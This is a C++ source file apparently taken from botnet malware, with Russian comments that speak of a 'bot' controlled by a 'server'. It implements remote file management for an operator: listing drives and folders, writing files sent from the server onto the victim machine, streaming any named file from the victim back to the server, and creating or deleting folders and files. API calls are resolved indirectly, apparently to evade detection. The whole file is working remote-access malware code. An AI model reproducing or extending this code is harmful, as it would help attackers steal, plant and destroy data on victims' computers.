#include "core\file.h"
#include "core\debug.h"
#include "WndRec\FileTransfer.h"
#include "WndRec\stream.h"

namespace WndRec
{

//сколько одновременно можно копировать файла с сервера на бота
const int MaxFileCopies = 8;
static bool stopCopy = false;

static bool MD5File( const char* fileName, Mem::Data& md5 );

struct FileCopy
{
	char fileName[MAX_PATH];
	HANDLE handle;
	uint idStream;
	uint copied; //сколько уже скопировали байт
	uint sizeFile; //размер копируемого файла
};

#pragma pack(1)
struct DataServer2Bot
{
	uint idStream; //поток куда шлется отчет о выполнении операции
	ushort lenNameFile; //имя файла передается только в первом пакете (num = 0), в последующих пакетах lenNameFile = 0
	ushort sizeData; //размер переданных данных
	ushort num; //порядковый номер данных файла
	ushort state; //флаги: 1 - стартовый пакет, 2 - последний пакет
	uint sizeFile; //размер всего файла
	//далее: имя файла
	//		 данные
};

struct DataBot2Server
{
	int numPacket; //номер пакета
	byte type; //тип пакета: 0 - данные, 1 - хеш сумма (передается после того как передан весь файл), 2 - указанного файла нет, 3 - ошибка (numPacket код ошибки)
	ushort size; //количество передаваемых данных в пакете
};

struct FileInfo
{
	ushort lenNameFile;
	__int64 sizeFile;
	__int64 sizeFree; //для диcка
	DWORD attributes;
	byte day, month;
	ushort year;
	byte hour, minute, second;
	//далее идет имя файла
};
#pragma pack()

struct BufStream
{
	ServerData* server;
	uint idStream;
	byte* data;
	int c_data, sz_data;
};

FileCopy fileCopies[MaxFileCopies];

bool FT_Init()
{
	Mem::Zero(fileCopies);
	stopCopy = false;
	return true;
}

static void AddData( BufStream* bs, void* data, int c_data, void* data2, int c_data2, bool send )
{
	if( bs->c_data + c_data + c_data2 > bs->sz_data )
	{
		WriteStream( bs->server, bs->idStream, bs->data, bs->c_data );
		bs->c_data = 0;
	}
	Mem::Copy( bs->data + bs->c_data, data, c_data );
	bs->c_data += c_data;
	Mem::Copy( bs->data + bs->c_data, data2, c_data2 );
	bs->c_data += c_data2;
	if( send )
		WriteStream( bs->server, bs->idStream, bs->data, bs->c_data );
}

static void InitBufStream( BufStream& bs, ServerData* server, uint idStream )
{
	bs.data = (byte*)Mem::Alloc(4000);
	bs.sz_data = 4000;
	bs.c_data = 0;
	bs.server = server;
	bs.idStream = idStream;
}

static void ReleaseBufStream( BufStream& bs )
{
	Mem::Free(bs.data);
}

static bool FT_DirCallback( File::FileInfo& fi, void* tag )
{
	BufStream* bs = (BufStream*)tag;
	if( (fi.fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && ((fi.fd.cFileName[0] == '.' && fi.fd.cFileName[1] == 0) || 
		(fi.fd.cFileName[0] == '.' && fi.fd.cFileName[1] == '.' && fi.fd.cFileName[2] == 0)) )
		return true;
	FileInfo fi2;
	fi2.lenNameFile = Str::Len(fi.fd.cFileName);
	fi2.attributes = fi.fd.dwFileAttributes;
	SYSTEMTIME st;
	API(KERNEL32, FileTimeToSystemTime)( &fi.fd.ftCreationTime, &st );
	fi2.day = st.wDay;
	fi2.month = st.wMonth;
	fi2.year = st.wYear;
	fi2.hour = st.wHour;
	fi2.minute = st.wMinute;
	fi2.second = st.wSecond;
	DWORD* sizeFile = (DWORD*)&fi2.sizeFile;
	sizeFile[0] = fi.fd.nFileSizeLow;
	sizeFile[1] = fi.fd.nFileSizeHigh;
	fi2.sizeFree = 0;
	DbgMsg( fi.fd.cFileName );
	AddData( bs, &fi2, sizeof(fi2), fi.fd.cFileName, fi2.lenNameFile, false );
	return true;
}

void FT_Dir( ServerData* server, const byte* data, int c_data )
{
	uint idStream = *((uint*)data); //ид канала куда отправлять результат
	data += sizeof(idStream);
	int lenFolder = *((ushort*)data); //длина имени папки содержимое которой нужно возвратить
	data += sizeof(ushort);
	BufStream bs;
	InitBufStream( bs, server, idStream );
	FileInfo fi;
	if( lenFolder )
	{
		StringBuilder folder( lenFolder + 1, (char*)data, lenFolder );
		File::ListFiles( folder, _CS_("*.*"), FT_DirCallback, 2, &bs );
	}
	else //возвратить список дисков
	{
		DWORD drivers = API(KERNEL32, GetLogicalDrives)();
		char disk[4]; disk[0] = 'A'; disk[1] = ':'; disk[2] = '\\'; disk[3] = 0;
		Mem::Zero(fi);
		fi.lenNameFile = 3;
		for( int i = 2; i <= 27; i++ )
		{
			DWORD b = 1 << i;
			if( drivers & b )
			{
				disk[0] = 'A' + i;
				fi.attributes = API(KERNEL32, GetDriveTypeA)(disk) | FILE_ATTRIBUTE_DEVICE;
				ULARGE_INTEGER l;
				API(KERNEL32, GetDiskFreeSpaceExA)( disk, (ULARGE_INTEGER*)&fi.sizeFree, (ULARGE_INTEGER*)&fi.sizeFile, 0 );
				AddData( &bs, &fi, sizeof(fi), disk, 3, false );
			}
		}
	}
	Mem::Zero(fi);
	AddData( &bs, &fi, sizeof(fi), 0, 0, true );
	ReleaseBufStream(bs);
}

void FT_CopyServer2Bot( ServerData* server, const byte* data, int c_data )
{
	stopCopy = false;
	DataServer2Bot* pk = (DataServer2Bot*)data;
	int lenNameFile = pk->lenNameFile;
	if( lenNameFile <  0 ) lenNameFile = 0;
	if( lenNameFile + pk->sizeData + sizeof(DataServer2Bot) > c_data ) return; //на случай если пакет неверный
	int i = 0;
	for( ; i < MaxFileCopies; i++ )
	{
		if( fileCopies[i].idStream == pk->idStream )
			break;
	}
	if( i < MaxFileCopies )
	{
		if( pk->num == 0 ) //новый файл, но видать старый был не закрыт, закрываем
			File::Close( fileCopies[i].handle );
	}
	else //такого файла еще нет
	{
		for( i = 0; i < MaxFileCopies; i++ )
			if( !fileCopies[i].handle )
				break;
	}
	if( i < MaxFileCopies )
	{
		if( pk->num == 0 || (pk->state & 1) ) //новый файл
		{
			Str::Copy( fileCopies[i].fileName, MAX_PATH, (char*)data + sizeof(DataServer2Bot), lenNameFile );
			DbgMsg( "Загрузка файла %s", fileCopies[i].fileName );
			fileCopies[i].handle = File::Open( fileCopies[i].fileName, GENERIC_WRITE, CREATE_ALWAYS );
			if( fileCopies[i].handle ) //удалось создать
			{
				fileCopies[i].copied = 0;
				fileCopies[i].idStream = pk->idStream;
				fileCopies[i].sizeFile = pk->sizeFile;
			}
			else //не удалось создать
			{
				fileCopies[i].fileName[0] = 0;
				fileCopies[i].idStream = 0;
				DataBot2Server answer;
				answer.numPacket = API(KERNEL32, GetLastError)();
				answer.type = 3;
				answer.size = 0;
				WriteStream( server, pk->idStream, &answer, sizeof(answer) );
			}
		}
		if( fileCopies[i].handle )
		{
			DbgMsg( "Блок %d файла %s, %d+%d", pk->num, fileCopies[i].fileName, fileCopies[i].copied, pk->sizeData );
			bool close = false;
			if( File::Write( fileCopies[i].handle, data + sizeof(DataServer2Bot) + lenNameFile, pk->sizeData ) )
			{
				fileCopies[i].copied += pk->sizeData;
				if( fileCopies[i].copied >= fileCopies[i].sizeFile || (pk->state & 2) ) //конец файла
					close = true;
				else
				{
					DataBot2Server answer;
					answer.numPacket = pk->num;
					answer.type = 0;
					answer.size = pk->sizeData;
					WriteStream( server, pk->idStream, &answer, sizeof(answer) );
				}
			}
			else
				close = true;
			if( close )
			{
				File::Close( fileCopies[i].handle );
				char answer[sizeof(DataBot2Server) + 16];
				int c_answer = sizeof(DataBot2Server);
				DataBot2Server* head = (DataBot2Server*)answer;
				head->numPacket = 0;
				head->type = 1;
				Mem::Data md5;
				if( MD5File( fileCopies[i].fileName, md5 ) )
				{
					head->size = 16;
					Mem::Copy( answer + sizeof(DataBot2Server), md5.p_byte(), 16 );
					c_answer += 16;
				}
				else
					head->size = 0;
				WriteStream( server, pk->idStream, answer, c_answer );
				Mem::Set( &fileCopies[i], 0, sizeof(FileCopy) );
			}
		}
	}
}

struct StruCopyBot2Server
{
	ServerData* server;
	byte* data;
	int c_data;
};

DWORD WINAPI ThreadCopyBot2Server( void* v )
{
	StruCopyBot2Server* cbs = (StruCopyBot2Server*)v;
	byte* data = cbs->data;
	uint idStream = *((uint*)data); data += 4;
	short lenFileName = *((short*)data); data += 2;
	char fileName[MAX_PATH];
	Str::Copy( fileName, sizeof(fileName), (char*)data, lenFileName );
	DbgMsg( "Передача файла %s на сервер", fileName );
	HANDLE hfile = File::Open( fileName, GENERIC_READ, OPEN_EXISTING );
	Mem::Data buf(4000);
	DataBot2Server* head = (DataBot2Server*)buf.Ptr();
	if( hfile )
	{
		int n = 0; //номер пакета
		HCRYPTPROV hprov;
		API(ADVAPI32, CryptAcquireContextA)( &hprov, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT );
		HCRYPTHASH hhash;
		API(ADVAPI32, CryptCreateHash)( hprov, CALG_MD5, 0, 0, &hhash );
		while(!stopCopy)
		{
			if( cbs->server->packageOut.count < 100 )
			{
				uint readed = File::Read( hfile, buf.p_byte() + sizeof(DataBot2Server), buf.Size() - sizeof(DataBot2Server) );
				if( readed == 0 ) break;
				head->numPacket = n++;
				head->type = 0;
				head->size = readed;
				WriteStream( cbs->server, idStream, buf.Ptr(), sizeof(DataBot2Server) + readed );
				API(ADVAPI32, CryptHashData)( hhash, buf.p_byte() + sizeof(DataBot2Server), readed, 0 );
			}
			if( (n % 50) == 0 || cbs->server->packageOut.count >= 100 ) WaitSendedPackages( cbs->server, 10, 1000 );
		}
		File::Close(hfile);
		head->numPacket = n++;
		head->type = 1;
		DbgMsg( "Отсылка файла окончена, передано %d пакетов", n );
		DWORD sizeHash = 16;
		API(ADVAPI32, CryptGetHashParam)( hhash, HP_HASHVAL, buf.p_byte() + sizeof(DataBot2Server), &sizeHash, 0 );
		head->size = sizeHash;
		API(ADVAPI32, CryptDestroyHash)(hhash);
		API(ADVAPI32, CryptReleaseContext)( hprov, 0 );
	}
	else
	{
		head->numPacket = 0;
		head->type = 2;
		head->size = 0;
	}
	if( !stopCopy )	WriteStream( cbs->server, idStream, buf.Ptr(), sizeof(DataBot2Server) + head->size );
	Mem::Free(cbs->data);
	Mem::Free(cbs);
	return 0;
}

void FT_CopyBot2Server( ServerData* server, const byte* data, int c_data )
{
	stopCopy = false;
	StruCopyBot2Server* cbs = (StruCopyBot2Server*)Mem::Alloc(sizeof(StruCopyBot2Server));
	cbs->server = server;
	cbs->data = (byte*)Mem::Duplication( data, c_data );
	cbs->c_data = c_data;
	RunThread( ThreadCopyBot2Server, cbs );
}

void FT_StopCopy()
{
	DbgMsg( "Остановка копирование файлов" );
	stopCopy = true;
	for(int i = 0; i < MaxFileCopies; i++ )
	{
		if( fileCopies[i].handle )
			File::Close(fileCopies[i].handle);
		Mem::Set( &fileCopies[i], 0, sizeof(FileCopy) );
	}
}

void FT_MkDir( ServerData* server, const byte* data, int c_data )
{
	uint idStream = *((uint*)data); //ид канала куда отправлять результат
	data += sizeof(idStream);
	int lenFolder = *((ushort*)data); //длина имени папки 
	data += sizeof(ushort);
	char folder[MAX_PATH];
	Str::Copy( folder, sizeof(folder), (char*)data, lenFolder );
	int answer;
	answer = 0;
	DbgMsg( "Создание папки %s", folder );
	if( !Path::CreateDirectory(folder) )
		 answer = API(KERNEL32, GetLastError)();
	WriteStream( server, idStream, &answer, sizeof(answer) );
}

void FT_DelFile( ServerData* server, const byte* data, int c_data )
{
	uint idStream = *((uint*)data); //ид канала куда отправлять результат
	data += sizeof(idStream);
	int len = *((ushort*)data); //длина пути
	data += sizeof(ushort);
	char path[MAX_PATH];
	Str::Copy( path, sizeof(path), (char*)data, len );
	bool sucess = false;
	DWORD attr = API(KERNEL32, GetFileAttributesA)(path);
	if( attr != INVALID_FILE_ATTRIBUTES )
	{
		if( attr & FILE_ATTRIBUTE_DIRECTORY )
		{
			DbgMsg( "Удаление папки %s", path );
			sucess = Path::DeleteDirectory(path);
		}
		else
		{
			DbgMsg( "Удаление файла %s", path );
			sucess = File::Delete(path);
		}
	}
	int answer;
	answer = 0;
	if( !sucess ) answer = API(KERNEL32, GetLastError)();
	WriteStream( server, idStream, &answer, sizeof(answer) );
}


bool MD5File( const char* fileName, Mem::Data& md5 )
{
	HANDLE hfile = File::Open( fileName, GENERIC_READ, OPEN_EXISTING );
	if( !hfile ) return false;
	HCRYPTPROV hprov;
	bool ret = false;
	if( API(ADVAPI32, CryptAcquireContextA)( &hprov, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT ) )
	{
		HCRYPTHASH hhash;
		if( API(ADVAPI32, CryptCreateHash)( hprov, CALG_MD5, 0, 0, &hhash ) )
		{
			byte buf[512];
			for(;;)
			{
				uint readed = File::Read( hfile, buf, sizeof(buf) );
				if( readed == 0 ) break;
				API(ADVAPI32, CryptHashData)( hhash, buf, readed, 0 );
			}
			DWORD sizeHash = 16;
			if( API(ADVAPI32, CryptGetHashParam)( hhash, HP_HASHVAL, buf, &sizeHash, 0 ) )
			{
				md5.Copy( buf, sizeHash );
				ret = true;
			}
			API(ADVAPI32, CryptDestroyHash)(hhash);
		}
		API(ADVAPI32, CryptReleaseContext)( hprov, 0 );
	}
	File::Close(hfile);
	return ret;
}

}
